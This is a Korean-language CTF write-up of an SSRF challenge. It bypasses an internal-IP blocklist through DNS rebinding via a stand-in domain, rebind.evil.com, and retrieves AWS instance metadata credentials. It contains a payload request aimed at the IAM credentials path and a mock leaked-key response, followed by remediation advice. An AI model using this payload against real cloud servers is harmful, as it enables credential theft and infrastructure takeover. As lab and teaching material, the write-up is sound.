+++
title = "VulnABLE CTF [LUXORA] Write-up: SSRF 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SSRF", "Silver", "DNS Rebinding", "Cloud Metadata", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: SSRF 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Server-Side Layer (SSRF)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/ssrf/silver`
- **목표**: 서버가 사용자가 입력한 URL의 IP 주소를 검사하여 사설망(127.0.0.1, 169.254.169.254 등)을 차단하는 방어 로직을 구현했지만, **DNS Rebinding(도메인 네임 시스템 우회)** 기법을 사용하여 이 검증을 우회하고 클라우드 메타데이터를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어 로직 분석 (Reconnaissance)

`/ssrf/silver` 경로 역시 URL Preview 기능입니다.
Bronze에서 썼던 로컬호스트 페이로드(`http://127.0.0.1/admin`)를 넣어봅니다.

**[서버의 에러 응답]**
```html
<div class="error">
  [Security Block] Access to internal IP address (127.0.0.1) is denied.
</div>
```
클라우드 메타데이터 IP인 `http://169.254.169.254/latest/meta-data/` 를 넣어도 마찬가지로 차단당합니다.

**[해커의 사고 과정]**
1. 백엔드에서 내가 입력한 URL의 도메인을 DNS로 해석(Resolve)하여 IP를 알아낸 다음, 그 IP가 블랙리스트에 있으면 차단하고 있다. (안전한 방어 로직)
2. 하지만 여기서 **Time-Of-Check to Time-Of-Use (TOCTOU)** 문제가 발생할 수 있다.
3. 서버가 검사(Check)를 위해 DNS에 질의할 때와, 실제로 데이터를 가져오기(Use) 위해 다시 HTTP 요청을 보낼 때, 그 아주 짧은 찰나의 순간에 **도메인의 IP가 바뀐다면?**
4. 내가 1초 단위로 IP가 휙휙 바뀌는 해커 도메인을 하나 만들면 이 검증을 통과할 수 있다! (DNS Rebinding 공격)

---

## 💥 2. 취약점 식별 및 DNS Rebinding 전략 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(url=http://169.254.169.254)--> [ Web Server ]
                                               |-- Fetches Metadata
<-- Metadata Returned -------------------------|
```


이 챌린지는 클라우드 환경(예: AWS EC2)에서 실행 중이라고 가정하며, 타겟은 서버의 IAM 권한 토큰을 뱉어내는 마법의 IP, `169.254.169.254` 입니다.

### 💡 DNS Rebinding 서버 구축
해커는 자신의 도메인 네임 서버(DNS Server)를 직접 구축하거나, 온라인에서 제공하는 DNS Rebinding 도구(예: `rbndr.us`)를 사용합니다.

이 악성 DNS 서버는 누군가 도메인(`rebind.evil.com`)의 IP를 물어볼 때마다 **매번 다른 IP**를 대답하도록 설정(TTL=0)됩니다.

- **1번째 질의 (서버가 검증할 때)** ➔ 응답: `8.8.8.8` (정상적인 구글 IP, 검증 통과)
- **2번째 질의 (서버가 실제 HTTP 접속할 때)** ➔ 응답: `169.254.169.254` (타겟 내부망 IP, SSRF 발생)

### 페이로드 전송
해커는 준비한 도메인을 타겟 서버에 파라미터로 전송합니다.

```http
POST /ssrf/silver HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://rebind.evil.com/latest/meta-data/iam/security-credentials/admin-role
```

---

## 🚀 3. 공격 수행 및 결과 확인

서버 내부에서는 다음과 같은 흐름이 순식간에 일어납니다.

1. **[보안 검증 단계]**
   - 서버: "rebind.evil.com IP가 뭐지?" ➔ DNS 서버: "8.8.8.8"
   - 서버: "음, 8.8.8.8은 외부 IP니까 안전하군. 통과!"
2. **[실제 HTTP 요청 단계]**
   - 서버: "좋아, 저 도메인으로 HTTP 클라이언트를 이용해 접속해 볼까. (캐시 만료) 어 IP가 뭐였더라?"
   - 서버: "rebind.evil.com IP 다시 알려줘." ➔ DNS 서버: "169.254.169.254"
   - 서버: (아무 생각 없이 `169.254.169.254` 로 접속)

### 🔍 서버의 최종 응답
메타데이터 서버는 자신을 부른 주체가 EC2 인스턴스 자신이므로 의심 없이 권한(Credentials)을 통째로 넘겨줍니다.

```json
<div class="preview">
{
  "Code": "Success",
  "LastUpdated": "2023-11-01T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FLAG{SSRF_🥈_DNS_REBIND_CLOUD_META_F1A2B3}"
}
</div>
```
클라우드 인프라 전체를 파괴할 수 있는 AWS IAM 키가 통째로 유출되었습니다!

---

## 🚩 4. 롸잇업 결론 및 플래그

애플리케이션 코드 레벨에서 도메인을 파싱하고 IP를 검사하는 방식은, DNS 프로토콜의 특성(TTL과 동적 갱신)을 이용한 DNS Rebinding 기법 앞에 무용지물이 될 수 있음을 입증했습니다.

**🔥 획득한 플래그:**
`FLAG{SSRF_🥈_DNS_REBIND_CLOUD_META_F1A2B3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
근본적인 원인은 '검증할 때의 도메인 해석'과 '실제 연결할 때의 도메인 해석'이 두 번 독립적으로 일어나는 TOCTOU 로직 결함입니다.

* **안전한 패치 가이드 (IP 고정 및 인프라 방어)**
1. **단일 DNS 해석 (Single Resolution)**: 
   코드 레벨에서 DNS 해석을 딱 한 번만 수행한 뒤, 반환된 IP 주소(예: `8.8.8.8`)를 검증합니다. 검증을 통과하면 원본 도메인(`rebind.evil.com`)이 아닌, **아까 검증을 마친 그 IP 주소(`8.8.8.8`)를 사용해 직접 HTTP 요청**을 생성해야 합니다. (이때 Host 헤더는 원본 도메인으로 유지)
2. **Network Level (VPC/Firewall) 차단**:
   가장 확실한 방법입니다. 애플리케이션 서버(EC2 등)에 아웃바운드 라우팅 규칙(iptables, Security Group)을 적용하여, 웹 앱을 실행하는 프로세스가 `169.254.169.254` 와 같은 메타데이터 IP에 절대 접근하지 못하게 네트워크 수준에서 싹둑 잘라버려야 합니다. IMDSv2(Session Token 필수 사용)를 활성화하는 것도 좋은 대안입니다.